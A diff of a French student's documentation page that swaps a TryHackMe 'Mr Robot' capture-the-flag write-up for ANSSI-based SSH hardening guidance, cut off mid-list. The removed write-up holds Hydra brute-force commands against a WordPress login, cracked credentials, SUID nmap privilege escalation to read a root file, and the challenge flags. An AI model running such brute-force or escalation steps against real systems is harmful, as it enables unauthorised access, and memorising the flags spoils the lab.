@@ -13,8 +13,10 @@
       
       
       
-        <link rel="prev" href="../Internal_Write-Up/">
+        <link rel="prev" href="../Gestion_de_projet_Definition/">
       
+      
+        <link rel="next" href="../PenTest_Cheat_Sheet/">
       
       
       <link rel="icon" href="../img/logo.png">
@@ -22,7 +24,7 @@
     
     
       
-        <title>Mr Robot - Documentation Nathan Etinzon CEFIM</title>
+        <title>Hardening SSH - Documentation Nathan Etinzon CEFIM</title>
       
     
     
@@ -79,7 +81,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#mr-robot-write-up" class="md-skip">
+        <a href="#hardening-ssh" class="md-skip">
           Aller au contenu
         </a>
       
@@ -114,7 +116,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Mr Robot
+              Hardening SSH
             
           </span>
         </div>
@@ -326,10 +328,30 @@
       
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../Hardening_Etinzon_Nathan/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Hardening SSH
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   <span class="md-ellipsis">
@@ -338,6 +360,158 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table des matières">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table des matières
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#bonnes-pratiques-implementation-ssh" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bonnes pratiques - Implémentation SSH
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#the-bastion" class="md-nav__link">
+    <span class="md-ellipsis">
+      The Bastion
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="The Bastion">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#telechargement" class="md-nav__link">
+    <span class="md-ellipsis">
+      Téléchargement
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#installation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Installation
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      Setup
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#check" class="md-nav__link">
+    <span class="md-ellipsis">
+      Check
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#creation-du-premier-compte" class="md-nav__link">
+    <span class="md-ellipsis">
+      Création du premier compte
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#configuration-client-pour-se-connecter-au-bastion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Configuration Client (pour se connecter au bastion)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#configuration-serveur" class="md-nav__link">
+    <span class="md-ellipsis">
+      Configuration Serveur
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#knockd" class="md-nav__link">
+    <span class="md-ellipsis">
+      Knockd
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#installation_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Installation
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#configuration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Configuration
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#configuration-iptables" class="md-nav__link">
+    <span class="md-ellipsis">
+      Configuration iptables
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#script-client-knockd" class="md-nav__link">
+    <span class="md-ellipsis">
+      Script Client Knockd
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -366,21 +540,19 @@
       
   
   
-    
   
   
-  
     
     
     
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
         
           
           <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
@@ -394,7 +566,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_8">
             <span class="md-nav__icon md-icon"></span>
             Write-up TryHack Me
@@ -426,30 +598,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  <span class="md-ellipsis">
-    Mr Robot
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../Mr-Robot_Write-Up/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -458,311 +610,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table des matières">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table des matières
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#reconnaissance" class="md-nav__link">
-    <span class="md-ellipsis">
-      Reconnaissance
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Reconnaissance">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#robotstxt" class="md-nav__link">
-    <span class="md-ellipsis">
-      robots.txt
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#enumeration" class="md-nav__link">
-    <span class="md-ellipsis">
-      Enumération
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Enumération">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#nmap" class="md-nav__link">
-    <span class="md-ellipsis">
-      Nmap
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Nmap">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#commande" class="md-nav__link">
-    <span class="md-ellipsis">
-      Commande
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#informations" class="md-nav__link">
-    <span class="md-ellipsis">
-      Informations
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#gobuster" class="md-nav__link">
-    <span class="md-ellipsis">
-      Gobuster
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Gobuster">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#commandes" class="md-nav__link">
-    <span class="md-ellipsis">
-      Commandes
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#informations_1" class="md-nav__link">
-    <span class="md-ellipsis">
-      Informations
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#wappalizer" class="md-nav__link">
-    <span class="md-ellipsis">
-      Wappalizer
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Wappalizer">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#informations_2" class="md-nav__link">
-    <span class="md-ellipsis">
-      Informations
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#wpscan" class="md-nav__link">
-    <span class="md-ellipsis">
-      WPScan
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="WPScan">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#commande_1" class="md-nav__link">
-    <span class="md-ellipsis">
-      Commande
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#informations_3" class="md-nav__link">
-    <span class="md-ellipsis">
-      Informations
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#brute-force" class="md-nav__link">
-    <span class="md-ellipsis">
-      Brute-force
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Brute-force">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#sqlmap" class="md-nav__link">
-    <span class="md-ellipsis">
-      SQLMap
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="SQLMap">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#commande_2" class="md-nav__link">
-    <span class="md-ellipsis">
-      Commande
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#informations_4" class="md-nav__link">
-    <span class="md-ellipsis">
-      Informations
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#hydra" class="md-nav__link">
-    <span class="md-ellipsis">
-      Hydra
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Hydra">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#commande_3" class="md-nav__link">
-    <span class="md-ellipsis">
-      Commande
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#informations_5" class="md-nav__link">
-    <span class="md-ellipsis">
-      Informations
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#acces-initial" class="md-nav__link">
-    <span class="md-ellipsis">
-      Accès initial
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Accès initial">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#identifiant-dans-homerobotpasswordraw-md5" class="md-nav__link">
-    <span class="md-ellipsis">
-      Identifiant dans /home/robot/password.raw-md5
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#escalade-de-privileges" class="md-nav__link">
-    <span class="md-ellipsis">
-      Escalade de privilèges
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#flags" class="md-nav__link">
-    <span class="md-ellipsis">
-      Flags
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -802,287 +649,134 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#reconnaissance" class="md-nav__link">
+  <a href="#bonnes-pratiques-implementation-ssh" class="md-nav__link">
     <span class="md-ellipsis">
-      Reconnaissance
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Reconnaissance">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#robotstxt" class="md-nav__link">
-    <span class="md-ellipsis">
-      robots.txt
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#enumeration" class="md-nav__link">
-    <span class="md-ellipsis">
-      Enumération
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Enumération">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#nmap" class="md-nav__link">
-    <span class="md-ellipsis">
-      Nmap
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Nmap">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#commande" class="md-nav__link">
-    <span class="md-ellipsis">
-      Commande
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#informations" class="md-nav__link">
-    <span class="md-ellipsis">
-      Informations
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#gobuster" class="md-nav__link">
-    <span class="md-ellipsis">
-      Gobuster
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Gobuster">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#commandes" class="md-nav__link">
-    <span class="md-ellipsis">
-      Commandes
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#informations_1" class="md-nav__link">
-    <span class="md-ellipsis">
-      Informations
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#wappalizer" class="md-nav__link">
-    <span class="md-ellipsis">
-      Wappalizer
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Wappalizer">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#informations_2" class="md-nav__link">
-    <span class="md-ellipsis">
-      Informations
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#wpscan" class="md-nav__link">
-    <span class="md-ellipsis">
-      WPScan
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="WPScan">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#commande_1" class="md-nav__link">
-    <span class="md-ellipsis">
-      Commande
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#informations_3" class="md-nav__link">
-    <span class="md-ellipsis">
-      Informations
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#brute-force" class="md-nav__link">
-    <span class="md-ellipsis">
-      Brute-force
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Brute-force">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#sqlmap" class="md-nav__link">
-    <span class="md-ellipsis">
-      SQLMap
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="SQLMap">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#commande_2" class="md-nav__link">
-    <span class="md-ellipsis">
-      Commande
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#informations_4" class="md-nav__link">
-    <span class="md-ellipsis">
-      Informations
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#hydra" class="md-nav__link">
-    <span class="md-ellipsis">
-      Hydra
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Hydra">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#commande_3" class="md-nav__link">
-    <span class="md-ellipsis">
-      Commande
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#informations_5" class="md-nav__link">
-    <span class="md-ellipsis">
-      Informations
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#acces-initial" class="md-nav__link">
-    <span class="md-ellipsis">
-      Accès initial
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Accès initial">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#identifiant-dans-homerobotpasswordraw-md5" class="md-nav__link">
-    <span class="md-ellipsis">
-      Identifiant dans /home/robot/password.raw-md5
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#escalade-de-privileges" class="md-nav__link">
-    <span class="md-ellipsis">
-      Escalade de privilèges
+      Bonnes pratiques - Implémentation SSH
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#flags" class="md-nav__link">
+  <a href="#the-bastion" class="md-nav__link">
     <span class="md-ellipsis">
-      Flags
+      The Bastion
     </span>
   </a>
+  
+    <nav class="md-nav" aria-label="The Bastion">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#telechargement" class="md-nav__link">
+    <span class="md-ellipsis">
+      Téléchargement
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#installation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Installation
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      Setup
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#check" class="md-nav__link">
+    <span class="md-ellipsis">
+      Check
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#creation-du-premier-compte" class="md-nav__link">
+    <span class="md-ellipsis">
+      Création du premier compte
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#configuration-client-pour-se-connecter-au-bastion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Configuration Client (pour se connecter au bastion)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#configuration-serveur" class="md-nav__link">
+    <span class="md-ellipsis">
+      Configuration Serveur
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#knockd" class="md-nav__link">
+    <span class="md-ellipsis">
+      Knockd
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#installation_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Installation
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#configuration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Configuration
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#configuration-iptables" class="md-nav__link">
+    <span class="md-ellipsis">
+      Configuration iptables
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#script-client-knockd" class="md-nav__link">
+    <span class="md-ellipsis">
+      Script Client Knockd
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -1101,160 +795,330 @@
                   
 
 
-<h1 id="mr-robot-write-up">Mr Robot Write-up</h1>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="robotstxt">robots.txt</h3>
-<p>User-agent: *<br />
-fsocity.dic &lt;= Wordlist qui nous servira<br />
-key-1-of-3.txt &lt;= Premier flag</p>
-<hr />
-<h2 id="enumeration">Enumération</h2>
-<h3 id="nmap">Nmap</h3>
-<h4 id="commande">Commande</h4>
-<p><code>nmap -T4 -sC -sV -Pn -p- 10.10.37.192</code></p>
-<h4 id="informations">Informations</h4>
-<p>PORT    STATE  SERVICE  VERSION<br />
-22/tcp  closed ssh<br />
-80/tcp  open   http     Apache httpd<br />
-|_http-server-header: Apache<br />
-|_http-title: Site doesn't have a title (text/html).<br />
-443/tcp open   ssl/http Apache httpd<br />
-|_http-server-header: Apache<br />
-|_http-title: Site doesn't have a title (text/html).<br />
-| ssl-cert: Subject: commonName=www.example.com<br />
-| Not valid before: 2015-09-16T10:45:03<br />
-|_Not valid after:  2025-09-13T10:45:03<br />
-MAC Address: 02:9D:12:C9:C2:F7 (Unknown)  </p>
-<hr />
-<h3 id="gobuster">Gobuster</h3>
-<h4 id="commandes">Commandes</h4>
-<p><code>gobuster dir -u http://10.10.37.192 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50</code></p>
-<h4 id="informations_1">Informations</h4>
-<p>/blog (Status: 301)<br />
-/images (Status: 301)<br />
-/sitemap (Status: 200)<br />
-/rss (Status: 301)<br />
-/login (Status: 302)<br />
-/video (Status: 301)<br />
-/0 (Status: 301)<br />
-/feed (Status: 301)<br />
-/image (Status: 301)<br />
-/atom (Status: 301)<br />
-/wp-content (Status: 301)<br />
-/admin (Status: 301)<br />
-/audio (Status: 301)<br />
-/intro (Status: 200)<br />
-/wp-login (Status: 200)<br />
-/css (Status: 301)<br />
-/rss2 (Status: 301)<br />
-/license (Status: 200)<br />
-/wp-includes (Status: 301)<br />
-/js (Status: 301)<br />
-/Image (Status: 301)<br />
-/rdf (Status: 301)<br />
-/page1 (Status: 301)<br />
-/readme (Status: 200)<br />
-/robots (Status: 200)  </p>
-<hr />
-<h3 id="wappalizer">Wappalizer</h3>
-<h4 id="informations_2">Informations</h4>
-<p>WordPress 4.3.1<br />
-Adobe Analytics<br />
-Google Font API<br />
-Apache HTTP Server<br />
-Google PageSpeed 1.9.32.3<br />
-PHP5.5.29<br />
-MySQL<br />
-jQuery 1.11.3<br />
-Modernizr 2.8.3<br />
-jQuery Migrate<br />
-Google PageSpeed  </p>
-<hr />
-<h3 id="wpscan">WPScan</h3>
-<h4 id="commande_1">Commande</h4>
-<p><code>wpscan -h http://10.10.37.192/wordpress</code></p>
-<h4 id="informations_3">Informations</h4>
-<p>[+] Headers<br />
- | Interesting Entries:<br />
- |  - Server: Apache<br />
- |  - X-Mod-Pagespeed: 1.9.32.3-4523<br />
- | Found By: Headers (Passive Detection)<br />
- | Confidence: 100%  </p>
-<p>[+] robots.txt found: http://10.10.37.192/robots.txt<br />
- | Found By: Robots Txt (Aggressive Detection)<br />
- | Confidence: 100%  </p>
-<p>[+] XML-RPC seems to be enabled: http://10.10.37.192/xmlrpc.php<br />
- | Found By: Direct Access (Aggressive Detection)<br />
- | Confidence: 100%<br />
- | References:<br />
- |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br />
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner<br />
- |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos<br />
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login<br />
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access  </p>
-<p>[+] The external WP-Cron seems to be enabled: http://10.10.37.192/wp-cron.php<br />
- | Found By: Direct Access (Aggressive Detection)<br />
- | Confidence: 60%<br />
- | References:<br />
- |  - https://www.iplocation.net/defend-wordpress-from-ddos<br />
- |  - https://github.com/wpscanteam/wpscan/issues/1299  </p>
-<p>[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).<br />
- | Found By: Emoji Settings (Passive Detection)<br />
- |  - http://10.10.37.192/d40738b.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'<br />
- | Confirmed By: Meta Generator (Passive Detection)<br />
- |  - http://10.10.37.192/d40738b.html, Match: 'WordPress 4.3.1'  </p>
-<p>[+] WordPress theme in use: twentyfifteen<br />
- | Location: http://10.10.37.192/wp-content/themes/twentyfifteen/<br />
- | Last Updated: 2021-03-09T00:00:00.000Z<br />
- | Readme: http://10.10.37.192/wp-content/themes/twentyfifteen/readme.txt<br />
- | [!] The version is out of date, the latest version is 2.9<br />
- | Style URL: http://10.10.37.192/wp-content/themes/twentyfifteen/style.css?ver=4.3.1<br />
- | Style Name: Twenty Fifteen<br />
- | Style URI: https://wordpress.org/themes/twentyfifteen/<br />
- | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...<br />
- | Author: the WordPress team<br />
- | Author URI: https://wordpress.org/<br />
- |
- | Found By: Css Style In 404 Page (Passive Detection)<br />
- |
- | Version: 1.3 (80% confidence)<br />
- | Found By: Style (Passive Detection)<br />
- |  - http://10.10.37.192/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'  </p>
-<hr />
-<h2 id="brute-force">Brute-force</h2>
-<h3 id="sqlmap">SQLMap</h3>
-<h4 id="commande_2">Commande</h4>
-<p><code>sqlmap -r post_req.txt --current-user</code></p>
-<h4 id="informations_4">Informations</h4>
-<p>Pas injectable :(</p>
-<hr />
-<h3 id="hydra">Hydra</h3>
-<h4 id="commande_3">Commande</h4>
-<p><code>hydra -L /tmp/fsocity_uniq.dic 10.10.37.192 -p X http-post-form "/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;Log+In:F=Invalid username."</code><br />
-<code>hydra -l elliot -P /tmp/fsocity_uniq.dic 10.10.37.192 http-post-form "/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;Log+In:F=is incorrect."</code></p>
-<h4 id="informations_5">Informations</h4>
-<p><em>La wordlist comprend beaucoup de doublons, on le voit avec <code>sort fsocity.dic | uniq | wc -l</code> =&gt; 11452 au lieu de ~800000</em><br />
-<em>On enleve les doublons avec la commande suivante : <code>sort fsocity.dic | uniq &gt; fsocity_uniq.dic</code></em>  </p>
-<p>[80][http-post-form] host: 10.10.37.192   login: elliot   password: X<br />
-[80][http-post-form] host: 10.10.37.192   login: Elliot   password: X<br />
-[80][http-post-form] host: 10.10.37.192   login: ELLIOT   password: X  </p>
-<p>[80][http-post-form] host: 10.10.37.192   login: elliot   password: ER28-0652</p>
-<hr />
-<h2 id="acces-initial">Accès initial</h2>
-<h3 id="identifiant-dans-homerobotpasswordraw-md5">Identifiant dans /home/robot/password.raw-md5</h3>
-<p>On crack et on trouve :<br />
-robot:abcdefghijklmnopqrstuvwxyz</p>
-<h2 id="escalade-de-privileges">Escalade de privilèges</h2>
-<p>SUID : <code>find / -perm -4000 -type f 2&gt;/dev/null</code><br />
-=&gt; /usr/local/bin/nmap<br />
-<code>nmap --interactive</code><br />
-<code>!cat /root/key-3-of-3.txt</code></p>
-<h2 id="flags">Flags</h2>
+<h1 id="hardening-ssh">Hardening SSH</h1>
+<h2 id="bonnes-pratiques-implementation-ssh">Bonnes pratiques - Implémentation SSH</h2>
 <ul>
-<li>Flag 1 : <code>073403c8a58a1f80d943455fb30724b9</code>  </li>
-<li>Flag 2 : <code>822c73956184f694993bede3eb39f959</code>  </li>
-<li>Flag 3 : <code>04787ddef27c3dee1ee161b21670b4e4</code>  </li>
+<li>Références:  <ul>
+<li>https://cyber.gouv.fr/publications/usage-securise-dopenssh  </li>
+<li>https://www.ssh-audit.com/hardening_guides.html</li>
 </ul>
+</li>
+</ul>
+<hr />
+<ol>
+<li>
+<p>Seule la <strong>version 2</strong> du protocole SSH doit être autorisée.</p>
+</li>
+<li>
+<p>Les serveurs d’accès distants TELNET, RSH, RLOGIN <strong>doivent être désinstallés</strong> du système.</p>
+</li>
+<li>
+<p><strong>SCP ou SFTP</strong> doivent être utilisés en lieu et place de protocoles historiques (RCP, FTP) pour du transfert ou du téléchargement de fichiers.</p>
+</li>
+<li>
+<p>L’usage de clés DSA n’est pas recommandé.</p>
+</li>
+<li>
+<p>La taille de clé minimale doit être de <strong>2048 bits pour RSA</strong>.</p>
+</li>
+<li>
+<p>La taille de clé minimale doit être de <strong>256 bits pour ECDSA</strong>.</p>
+</li>
+<li>
+<p>Lorsque les clients et les serveurs SSH supportent ECDSA, son usage doit être préféré à RSA.</p>
+</li>
+<li>
+<p>Les clés doivent être générées dans un contexte où la source d’<strong>aléa est fiable</strong>, ou à défaut dans un environnement où suffisamment d’entropie a été accumulée.</p>
+</li>
+<li>
+<p>Quelques règles permettent de s’assurer que le réservoir d’entropie est correctement rempli :  </p>
+<ol>
+<li>la machine de génération de clés doit être une machine physique ;</li>
+<li>elle doit disposer de plusieurs sources d’entropie indépendantes ;</li>
+<li>l’aléa ne doit être obtenu qu’après une période d’activité suffisamment importante (plusieurs minutes voire heures).</li>
+</ol>
+</li>
+<li>
+<p>La clé privée ne doit être connue que de l’entité qui cherche à prouver son identité à un tiers et éventuellement d’une autorité de confiance. Cette clé privée doit être dûment protégée pour en éviter la diffusion à une personne non autorisée</p>
+</li>
+<li>
+<p>L’AES-128 mode CBC doit être utilisé comme algorithme de chiffrement pour la protection de la clé privée utilisateur par mot de passe.</p>
+</li>
+<li>
+<p>L’algorithme de chiffrement doit reposer sur de l’AES 128, AES 192 ou AES 256, en mode CTR.<br />
+L’intégrité doit reposer sur du HMAC SHA-1, SHA-256 ou SHA-512.</p>
+</li>
+<li>
+<p>Une étape préliminaire à ce durcissement est donc d’user de drapeaux de compilation adéquats. Se rapporter par exemple aux "Recommandations de sécurité relatives à un système GNU/Linux".</p>
+</li>
+<li>
+<p>L’authentification d’un utilisateur doit se faire à l’aide d’un des mécanismes suivants, par ordre de préférence :</p>
+<ul>
+<li>par cryptographie asymétrique ECDSA;</li>
+<li>par cryptographie asymétrique RSA;</li>
+<li>par cryptographie symétrique (tickets Kerberos par la GSSAPI) ;</li>
+<li>PAM (ou BSD Auth) permettant de faire appel à des modules d’authentification tiers n’exposant pas le mot de passe utilisateur ou son condensat (OTP) ;</li>
+<li>par mot de passe vis à vis d’une base de données comme passwd/shadow ou annuaire.</li>
+</ul>
+</li>
+<li>
